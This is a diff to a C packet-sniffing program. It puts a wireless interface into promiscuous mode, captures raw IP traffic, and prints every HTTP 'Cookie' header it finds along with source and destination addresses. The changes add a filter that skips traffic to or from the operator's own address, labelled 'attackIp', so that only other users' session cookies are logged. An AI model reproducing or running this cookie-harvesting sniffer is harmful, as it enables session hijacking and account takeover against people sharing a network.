@@ -18,7 +18,7 @@
 #include<errno.h>
 #include<net/if.h>
 #define  MAX_BUFFER 4096
-const uint8_t attackIp[] = {192,168,0,195};
+const uint8_t attackIp[] = {10,164,72,101};
 int checkTCP(const  iphdr* iph, int cnt);
 int SetIfPromisc(int sock, char* frame)
 {
@@ -49,14 +49,27 @@ void showIP(uint8_t *s, uint8_t *d)
 	}
 	printf("%d.%d.%d.%d -> %d.%d.%d.%d\n", s[0], s[1], s[2], s[3], d[0], d[1], d[2], d[3]);
 }
+bool compareIp(const uint8_t *s, const uint8_t *d)
+{
+	return s[0] == d[0] && s[1] == d[1] && s[2] == d[2] && s[3] == d[3];
+}
+bool checkIp(uint8_t *s, uint8_t *d)
+{
+	if(s==NULL || d==NULL)
+	{
+		perror("s or d is null");
+		exit(0);
+	}
+	return compareIp(s, attackIp) || compareIp(d, attackIp) ;
+}
 int main()
 {
 	char* buffer[MAX_BUFFER];
-	char frame[] = "eth1";
+	char frame[] = "wlan0";
 	struct ether_header *etherh;
 	struct iphdr *iph;
 	int sock, n_read;
-	if((sock = socket(PF_PACKET,  SOCK_RAW, htons(ETH_P_ALL))) < 0)
+	if((sock = socket(PF_PACKET,  SOCK_RAW, htons(ETH_P_IP))) < 0)
 	{
 		perror("sock");	
 		exit(-1);
@@ -90,7 +103,7 @@ int checkTCP(const struct iphdr *iph, int cnt)
 	struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
 	http = (char*)(tcph + 1);
 	char *p = strstr(http, "Cookie");
-	if(p != NULL)
+	if(p != NULL && !checkIp((uint8_t*)&(iph->saddr), (uint8_t*)&(iph->daddr)))
 	{
 		printf("--------begin--------\n");
 		showIP((uint8_t*)&(iph->saddr), (uint8_t*)&(iph->daddr));
@@ -99,6 +112,7 @@ int checkTCP(const struct iphdr *iph, int cnt)
 		{
 			printf("%c", http[i]);
 		}
+		printf("length: %d\n", cnt-42);
 		printf("\n--------end--------\n");
 	}
 	return 1;
